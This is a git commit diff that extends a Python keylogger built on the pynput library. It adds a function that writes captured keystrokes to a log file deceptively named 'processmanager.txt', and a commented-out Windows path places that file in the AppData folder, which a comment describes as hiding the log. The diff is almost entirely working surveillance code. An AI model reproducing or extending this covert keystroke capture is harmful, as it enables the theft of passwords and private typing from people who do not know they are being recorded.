14ca1da431f028a47a5b978921dcaf424df5bf0a
Sivadath <52615657+sivadathdev@users.noreply.github.com>
2022-06-29 12:22:34 +0530

    Update keylogger.py
    writing keyboard inputs to a file.

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -4,6 +4,27 @@ from pynput.keyboard import Listener
 keys = []
 count = 0
 
+#path = os.environ['appdata'] + '\\processmanager.txt' #hiding the keylog o/p file in windows
+path = '/root/processmanager.txt'
+
+def write_file(keys):
+	with open(path, 'a') as f:
+		for key in keys:
+			k = str(key).replace("'","") #overiding the default formatting of pynput library.
+			if k.find("backspace") > 0:
+				f.write(" Backspace ")
+			elif k.find("enter") > 0:
+				f.write("\n")
+			elif k.find("shift") > 0:
+				f.write(" Shift ")
+			elif k.find("space") > 0:
+				f.write(" ")
+			elif k.find("caps_lock") > 0:
+				f.write(" caps_lock ")
+			elif k.find("Key"):
+				f.write(k)
+
+
 def on_press(key):
 	global keys, count
 
